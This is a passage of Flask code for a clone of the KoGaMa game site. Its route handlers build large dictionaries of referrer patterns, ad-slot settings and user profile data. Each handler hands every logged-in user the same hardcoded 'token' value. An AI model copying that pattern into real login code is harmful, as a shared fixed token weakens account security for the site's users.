             "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id": 7,
             "name": "CRAZYGAMES",
             "codename": "crazygames",
             "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id": 8,
             "name": "SpilGames",
             "codename": "spilgames",
             "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "ads_data": {
          "host": "www.kogama.com",
          "ref": 1,
          "consent": True,
          "name": "Google AdManager (old account)",
          "ads": {
             "top_banner": {
                "num": "0",
                "id": "kogama_mobile_leaderboard_1",
                "ad_unit_code": "leaderboard",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "skyscraper_left": {
                "num": "1",
                "id": "kogama-skyscraper-left",
                "ad_unit_code": "skyscraper_left",
                "sizes": "[160, 600]"
             },
             "skyscraper_right": {
                "num": "2",
                "id": "kogama-skyscraper-right",
                "ad_unit_code": "skyscraper",
                "sizes": "[160, 600]"
             },
             "bottom_banner": {
                "num": "4",
                "id": "kogama_mobile_leaderboard_2",
                "ad_unit_code": "leaderboard_bottom",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             },
             "comment_ad": {
                "num": "5",
                "id": "kogama_rectangle",
                "ad_unit_code": "rectangle",
                "sizes": "[300, 250]"
             },
             "wide_skyscraper": {
                "num": "3",
                "id": "kogama-wide-skyscraper",
                "ad_unit_code": "wide_skyscraper",
                "sizes": "[300, 600]"
             },
             "game_list_banner": {
                "num": "6",
                "id": "kogama_mobile_game_list_banner",
                "ad_unit_code": "game_list_banner",
                "sizes": "[728, 90]",
                "huge_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "big_sizes": "[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes": "[[728, 90],[468, 60]]",
                "small_sizes": "[[320, 50], [300, 50]]"
             }
          },
          "network_code": "46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/build/<int:user_id>/avatar/')
def build_active_avatar_page(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "object":{
          "gold":user.gold,
          "friends":user.friends,
          "last_ping": user.last_ping.isoformat() if user.last_ping else None,
          "leaderboard_rank":user.rank,
          "is_anonymous":False,
          "next_level_xp":user.next_level_xp,
          "id":user.id,
          "xp":user.xp,
          "created":user.created.isoformat() if user.created else None,
          "level_progress":user.level_progress,
          "level_images":get_level_images(user._level),
          "previous_level_xp":user.previous_level_xp,
          "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "username":user.username,
          "is_me":current_user.is_authenticated and current_user.id == user.id,
          "published":0,
          "xp_to_next_level":user.xp_to_next_level,
          "avatar_id":17873,
          "friends_limit":999,
          "notifications":0,
          "level":user._level,
          "description":user.description,
          "is_active":True,
          "pulse_status":user.pulse_status,
          "is_authenticated":False,
          "is_subscriber":False,
          "object_type_id":1
       },
      "locale": user_language,
      "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/build/<int:user_id>/avatar/<int:avatar_id>/')
def build_avatar_page(user_id, avatar_id):
    user = db.session.get(User, user_id)
    avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == user.id, Avatar.avatar_id == avatar_id)).first()
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    if not avatar:
        abort(404)
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "object":{
          "id":31418494,
          "name":" ",
          "creator":"nikbags420",
          "created":"2023-02-08T23:24:52+00:00",
          "owning":False,
          "has_liked":None,
          "author_profile_id":51610144,
          "sold_count":931,
          "likes_count":311,
          "image_small":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_46x46.jpg",
          "image_micro":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_18x18.jpg",
          "image_medium":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_64x64.jpg",
          "image_large":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_330x451.jpg",
          "images":{
             "micro":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_18x18.jpg",
             "small":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_46x46.jpg",
             "medium":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_64x64.jpg",
             "large":"https://web.archive.org/web/20260526160426/https://www.kogstatic.com/gen_cache/6c/6f/6c6fb9d3-6c66-4b70-ac1b-963281f1414d_330x451.jpg"
          },
          "product_id":"a-31418494",
          "price_gold":140,
          "category":"avatar"
       },
       "locale":"en_US",
       "referrers":[
          {
             "referrer_id":1,
             "name":"Kagama",
             "codename":"kogama",
             "urls":""
          },
          {
             "referrer_id":2,
             "name":"old_spilgames",
             "codename":"OldSpilGames",
             "urls":""
          },
          {
             "referrer_id":3,
             "name":"AdNPlay",
             "codename":"adnplay",
             "urls":""
          },
          {
             "referrer_id":4,
             "name":"GSM",
             "codename":"gsm",
             "urls":"games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"
          },
          {
             "referrer_id":5,
             "name":"Miniplay",
             "codename":"miniplay",
             "urls":"minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"
          },
          {
             "referrer_id":6,
             "name":"ORANGE",
             "codename":"orange",
             "urls":"kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"
          },
          {
             "referrer_id":7,
             "name":"CRAZYGAMES",
             "codename":"crazygames",
             "urls":"crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"
          },
          {
             "referrer_id":8,
             "name":"SpilGames",
             "codename":"spilgames",
             "urls":"cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"
          }
       ],
       "now":"2026-05-26T16:04:26.193854+00:00",
       "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
       }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/build/<int:user_id>/avatars/')
def build_avatars_page(user_id):
    user = db.session.get(User, user_id)
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    if not current_user.is_authenticated or user_id != current_user.id:
        abort(401)
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"
    object_data = {
       "object":{
          "gold":user.gold,
          "friends":user.friends,
          "last_ping": user.last_ping.isoformat() if user.last_ping else None,
          "leaderboard_rank":user.rank,
          "is_anonymous":False,
          "next_level_xp":user.next_level_xp,
          "id":user.id,
          "xp":user.xp,
          "created":user.created.isoformat() if user.created else None,
          "level_progress":user.level_progress,
          "level_images":get_level_images(user._level),
          "previous_level_xp":user.previous_level_xp,
          "images": user.AVATAR_IMAGES_MAP.get(user.avatar_id, {}),
          "username":user.username,
          "is_me":current_user.is_authenticated and current_user.id == user.id,
          "published":0,
          "xp_to_next_level":user.xp_to_next_level,
          "avatar_id":17873,
          "friends_limit":999,
          "notifications":0,
          "level":user._level,
          "description":user.description,
          "is_active":True,
          "pulse_status":user.pulse_status,
          "is_authenticated":False,
          "is_subscriber":False,
          "object_type_id":1
       },
      "locale": user_language,
      "ads_data":{
          "host":"www.kogama.com",
          "ref":1,
          "consent":True,
          "name":"Google AdManager (old account)",
          "ads":{
             "top_banner":{
                "num":"0",
                "id":"kogama_mobile_leaderboard_1",
                "ad_unit_code":"leaderboard",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "skyscraper_left":{
                "num":"1",
                "id":"kogama-skyscraper-left",
                "ad_unit_code":"skyscraper_left",
                "sizes":"[160, 600]"
             },
             "skyscraper_right":{
                "num":"2",
                "id":"kogama-skyscraper-right",
                "ad_unit_code":"skyscraper",
                "sizes":"[160, 600]"
             },
             "bottom_banner":{
                "num":"4",
                "id":"kogama_mobile_leaderboard_2",
                "ad_unit_code":"leaderboard_bottom",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             },
             "comment_ad":{
                "num":"5",
                "id":"kogama_rectangle",
                "ad_unit_code":"rectangle",
                "sizes":"[300, 250]"
             },
             "wide_skyscraper":{
                "num":"3",
                "id":"kogama-wide-skyscraper",
                "ad_unit_code":"wide_skyscraper",
                "sizes":"[300, 600]"
             },
             "game_list_banner":{
                "num":"6",
                "id":"kogama_mobile_game_list_banner",
                "ad_unit_code":"game_list_banner",
                "sizes":"[728, 90]",
                "huge_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "big_sizes":"[[980, 90], [970, 90], [950, 90]]",
                "mid_sizes":"[[728, 90],[468, 60]]",
                "small_sizes":"[[320, 50], [300, 50]]"
             }
          },
          "network_code":"46278883"
        }
    }
    if current_user.is_authenticated:
        object_data["current_user"] = {
            "gold": current_user.gold,
            "is_child": _safe_is_child(current_user.birthdate),
            "leaderboard_rank": current_user.rank,
            "birthdate_update_required": False,
            "language": user_language,
            "used_free_week_elite": 0,
            "is_subscriber_on_hold": False,
            "xp": current_user.xp,
            "subscription": None,
            "cookie_policy_accepted_version": 2,
            "level_images": get_level_images(current_user._level),
            "silver": 0,
            "gdpr_limited_age": False,
            "username": current_user.username,
            "is_me": True,
            "email": current_user.email or "",
            "level": current_user.level,
            "description": current_user.description,
            "is_anonymous": False,
            "cookie_policy_accept_required": False,
            "next_level_xp": current_user.next_level_xp,
            "birthdate": current_user.birthdate,
            "id": current_user.id,
            "token": "f2b15971-fdeb-4482-a832-34ae74aff958",
            "created": current_user.created.isoformat() if current_user.created else None,
            "level_progress": current_user.level_progress,
            "previous_level_xp": current_user.previous_level_xp,
            "images": current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {}),
            "email_confirmed": current_user.email_confirmed,
            "xp_to_next_level": current_user.xp_to_next_level,
            "friends_limit": 999,
            "notifications": 0,
            "is_subscriber": False,
            "is_active": True,
            "is_authenticated": True,
            "role": current_user.role,
            "is_admin": current_user.role in ('admin', 'mod', 'staff'),
            "object_type_id": 1
        }
    return render_template('kagama.html', language=user_language, title=title, error_data="null", breadcrumb_data="null", submenu_data="null", object_data=object_data), 200

@app.route('/leaderboard/')
def leaderboard_page():
    user_language = request.cookies.get('language', 'en_US')
    if current_user.is_authenticated:
        user_language = current_user.language
    title = "KaGaMa Games - Play and enjoy thousands of user-made games!"

    # ---- Full object_data (copied from home() to avoid placeholders) ----
    object_data = {
        "ADSONPAGE": True,
        "category": None,
        "locale": user_language,
        "referrers": [
            {"referrer_id": 1, "name": "Kagama", "codename": "kogama", "urls": ""},
            {"referrer_id": 2, "name": "old_spilgames", "codename": "OldSpilGames", "urls": ""},
            {"referrer_id": 3, "name": "AdNPlay", "codename": "adnplay", "urls": ""},
            {"referrer_id": 4, "name": "GSM", "codename": "gsm", "urls": "games\\.poki\\.com|1001oyun\\.com|123pelit\\.com|gamesfreak\\.net|hrajhry\\.sk|jeuxjeuxjeux\\.ch|jeuxjeuxjeux\\.fr|megajatek\\.hu|megaspel\\.se|moiteigri\\.com|paisdelosjuegos\\.cl|paisdelosjuegos\\.co\\.ve|paisdelosjuegos\\.com\\.ar|paisdelosjuegos\\.com\\.co|paisdelosjuegos\\.com\\.do|paisdelosjuegos\\.com\\.ec|paisdelosjuegos\\.com\\.mx|paisdelosjuegos\\.com\\.pa|paisdelosjuegos\\.com\\.pe|paisdelosjuegos\\.com\\.uy|paisdelosjuegos\\.cr|paisdelosjuegos\\.es|poki\\.at|poki\\.be|poki\\.by|poki\\.cn|poki\\.co\\.il|poki\\.com|poki\\.com\\.br|poki\\.cz|poki\\.de|poki\\.dk|poki\\.gr|poki\\.it|poki\\.jp|poki\\.nl|poki\\.no|poki\\.pl|poki\\.pt|poki\\.ro|spielyeti\\.ch|trochoi\\.net"},
            {"referrer_id": 5, "name": "Miniplay", "codename": "miniplay", "urls": "minijuegos\\.com|miniplay\\.com|minigiochi\\.com|minijogos\\.com\\.br|minijuegos\\.es|minijuegosgratis\\.com"},
            {"referrer_id": 6, "name": "ORANGE", "codename": "orange", "urls": "kizi\\.com|yepi\\.com|bgames\\.com|huz\\.com|spele\\.nl|spele\\.be|keygames\\.com|oyungemisi\\.com|spielspiele\\.de|spelletjesoverzicht\\.nl|games\\.co\\.za|spiels\\.at|spiels\\.ch|kilitoyun\\.com|hryhry\\.net|starbie\\.nl|starbie\\.co\\.uk|minigioco\\.it|pelaaleikkia\\.com|jouerjouer\\.com|clavejuegos\\.com|1001igry\\.ru|m\\.1001igry\\.ru|nyckelspel\\.se|waznygry\\.pl|jogojogar\\.com|youdagames\\.com|zigiz\\.com|stratego\\.com|gembly\\.com|cadajogo\\.cocadajogo\\.com|cadajuego\\.es|funny-games\\.co\\.uk|m\\.funny-games\\.co\\.uk|funnygames\\.asia|funnygames\\.at|funnygames\\.be|funnygames\\.befr|funnygames\\.biz|funnygames\\.ch|funnygames\\.cn|funnygames\\.co\\.id|funnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.cofunnygames\\.dk|funnygames\\.es|funnygames\\.eu|funnygames\\.fi|funnygames\\.fr|funnygames\\.gr|funnygames\\.hu|funnygames\\.ie|funnygames\\.in|funnygames\\.ir|funnygames\\.it|funnygames\\.jp|funnygames\\.kr|funnygames\\.lt|funnygames\\.nl|funnygames\\.no|funnygames\\.org|funnygames\\.ph|funnygames\\.pk|funnygames\\.pl|funnygames\\.pt|funnygames\\.ro|funnygames\\.ru|funnygames\\.se|funnygames\\.us|funnygames\\.vn|misjuegos\\.com|m\\.misjuegos\\.com"},
            {"referrer_id": 7, "name": "CRAZYGAMES", "codename": "crazygames", "urls": "crazygames\\.com|1001juegos\\.com|gioca\\.re|speelspelletjes\\.nl|onlinegame\\.co\\.id"},
            {"referrer_id": 8, "name": "SpilGames", "codename": "spilgames", "urls": "cdn\\.gameplayer\\.io|a10\\.com|girlsgogames\\.com|girlsgogames\\.ru|juegosdechicas\\.com|gry\\.pl|juegos\\.com|girlsgogames\\.fr|oyunskor\\.com|girlsgogames\\.pl|girlsgogames\\.co\\.uk|girlsgogames\\.com\\.br|girlsgogames\\.it|agame\\.com|girlsgogames\\.de|games\\.co\\.id|girlsgogames\\.nl|jeux\\.fr|girlsgogames\\.co\\.id|jeu\\.fr|spel\\.nl|flashgames\\.ru|girlsgogames\\.com\\.tr|gioco\\.it|zapjuegos\\.com|spelletjes\\.nl|spielen\\.com|ourgames\\.ru|girlsgogames\\.se|gamesgames\\.com|jetztspielen\\.de|ojogos\\.com\\.br|ojogos\\.pt|spela\\.se|giochi\\.it|spel\\.se|oyunoyna\\.com|games\\.co\\.uk|permainan\\.co\\.id"}
        ],
        "ads_data": {
            "host": "www.kogama.com",
            "ref": 1,
            "consent": True,
            "name": "Google AdManager (old account)",
            "ads": {
